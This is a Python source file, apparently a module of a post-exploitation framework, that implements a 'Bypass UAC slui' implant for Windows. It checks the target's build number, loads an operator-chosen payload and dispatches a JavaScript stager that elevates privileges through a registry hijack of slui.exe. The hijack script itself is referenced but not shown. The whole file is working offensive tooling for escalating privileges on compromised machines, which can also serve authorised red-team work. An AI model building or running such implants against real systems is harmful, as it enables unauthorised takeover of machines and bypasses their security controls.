import core.job
import core.implant
import uuid

class SLUIJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False
        if (int(self.session.build) < 9600 or int(self.session.build) > 17133) and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vuln", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"
        #self.shell.print_plain(self.data)

class SLUIImplant(core.implant.Implant):

    NAME = "Bypass UAC slui"
    DESCRIPTION = "Bypass UAC via registry hijack for slui.exe. Drops no files to disk."
    AUTHORS = ["TheNaterz", "bytecode77"]

    def load(self):
        self.options.register("PAYLOAD", "", "run listeners for a list of IDs")
        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)

    def job(self):
        return SLUIJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        self.options.set("PAYLOAD_DATA", payload)

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/elevate/bypassuac_slui.js", self.options)

        self.dispatch(workloads, self.job)
